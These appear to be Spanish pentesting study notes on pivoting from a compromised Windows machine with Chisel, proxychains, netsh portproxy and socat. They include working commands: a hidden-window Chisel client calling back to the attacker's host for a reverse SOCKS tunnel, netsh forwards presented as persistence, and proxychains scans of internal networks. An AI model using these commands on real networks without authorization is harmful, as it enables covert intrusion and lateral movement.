
---
Tags: #Pivoting #nc #netcat #socat #chisel #netsh #proxychains #portforwarding
## 1. Concepto de Pivoting (visión operativa)

**Pivoting** consiste en usar una máquina comprometida como **puente entre redes** para acceder a sistemas que no son visibles directamente desde el atacante.

En entornos reales suele implicar:

- Más de una red interna
    
- Restricciones de firewall
    
- Salidas limitadas (solo HTTP/HTTPS)
    

---

## 2. Escenario típico en Windows

- Kali (atacante)
    
- Windows comprometido con salida TCP
    
- Red interna adicional (o varias)
    

Objetivo:

- Crear **túneles estables**
    
- Encadenar accesos entre redes
    

---

## 3. Pivoting en Windows con CHISEL

### 3.1 Qué es Chisel

**Chisel** permite crear túneles TCP sobre HTTP/WebSockets.

Características clave:

- Funciona perfectamente en Windows
    
- Soporta SOCKS
    
- Ideal para pivoting dinámico
    

---

### 3.2 Chisel en Windows (ejecución oculta)

Comando real usado en Windows:

```powershell
powershell -Command "Start-Process chisel.exe -ArgumentList 'client 192.168.100.130:6543 R:9999:socks' -WindowStyle Hidden"
```

Explicación:

- `Start-Process` → lanza proceso en segundo plano
    
- `-WindowStyle Hidden` → sin ventana visible
    
- `client` → modo cliente
    
- `R:9999:socks` → SOCKS reverso
    

Resultado:

- SOCKS escuchando en Kali en `127.0.0.1:9999`
    

---

### 3.3 Chisel – Servidor (Kali)

```bash
./chisel server -p 6543
```

---

### 3.4 Uso con Proxychains

Editar `/etc/proxychains4.conf`:

```text
socks5 127.0.0.1 9999
```

Ejemplos:

```bash
proxychains nmap -sT -Pn 10.10.20.0/24
proxychains ssh user@10.10.20.5
```

---

## 4. Pivoting en Windows con NETSH PORTPROXY

### 4.1 Qué es netsh portproxy

`netsh interface portproxy` permite crear **reenvíos de puerto nativos en Windows**, sin herramientas externas.

Muy útil cuando:

- No se puede subir socat
    
- Se requiere persistencia
    

---

### 4.2 Ejemplo real de uso

```powershell
netsh interface portproxy add v4tov4 \
listenport=7654 listenaddress=0.0.0.0 \
connectport=7653 connectaddress=192.168.100.130
```

Explicación:

- `listenport=7654` → puerto local en Windows
    
- `connectaddress` → host interno
    
- `connectport` → servicio interno
    

Resultado:

- Acceder a `WINDOWS:7654` → red interna
    

---

### 4.3 Gestión

Ver reglas:

```powershell
netsh interface portproxy show all
```

Eliminar:

```powershell
netsh interface portproxy delete v4tov4 listenport=7654 listenaddress=0.0.0.0
```

---

## 5. Encadenamiento de redes: CHISEL + SOCAT

### 5.1 Problema

Cuando hay **más de dos redes**, un solo SOCKS no siempre es suficiente.

Ejemplo:

- Kali → Windows A → Linux B → Red C
    

---

### 5.2 Socat como pegamento entre túneles

**Socat** se usa para unir túneles y reenviar tráfico entre redes intermedias.

Ejemplo en una máquina pivot:

```bash
socat TCP-LISTEN:3456,fork TCP:192.168.200.50:3455
```

Este puerto puede:

- Apuntar a otro túnel Chisel
    
- Conectar con otra red
    

---

### 5.3 Flujo real encadenado

1. Windows crea SOCKS con Chisel
    
2. Kali usa proxychains
    
3. En pivot intermedio:
    
    - Socat reexpone el servicio
        
4. Nuevo túnel Chisel desde esa máquina
    

Resultado:

- Pivoting multinivel
    

---

## 6. Cuándo usar cada técnica

|Situación|Herramienta|
|---|---|
|Pivot dinámico|Chisel|
|Forward puntual|netsh portproxy|
|Unir redes|Socat|
|Sigilo|Chisel oculto|

---

## 7. Mentalidad profesional

- **Chisel** es el eje central
    
- **Netsh** da persistencia nativa
    
- **Socat** permite escalar el pivot
    

Pensar en pivoting como **topología de red**, no como un solo túnel.

---

## 8. Resumen rápido

1. Comprometes Windows
    
2. Levantas SOCKS con Chisel oculto
    
3. Configuras proxychains
    
4. Usas netsh o socat según el caso
    
5. Encadenas redes
    
6. Continúas el ataque
    

---

Apuntes orientados a **pentesting real, laboratorios avanzados y escenarios multinivel**, listos para Obsidian.